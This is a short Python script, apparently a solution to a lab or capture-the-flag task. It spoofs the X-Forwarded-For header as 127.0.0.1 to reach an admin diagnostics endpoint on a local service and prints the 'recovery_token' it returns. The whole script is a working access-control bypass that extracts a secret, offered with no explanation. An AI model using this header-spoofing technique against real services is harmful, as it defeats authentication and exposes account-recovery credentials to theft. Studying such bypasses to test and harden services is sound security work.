#!/usr/bin/env python3
import json
import urllib.request

request = urllib.request.Request(
    "http://127.0.0.1:8082/admin/diagnostics",
    headers={"X-Forwarded-For": "127.0.0.1"},
)
with urllib.request.urlopen(request) as response:
    print(json.load(response)["recovery_token"])
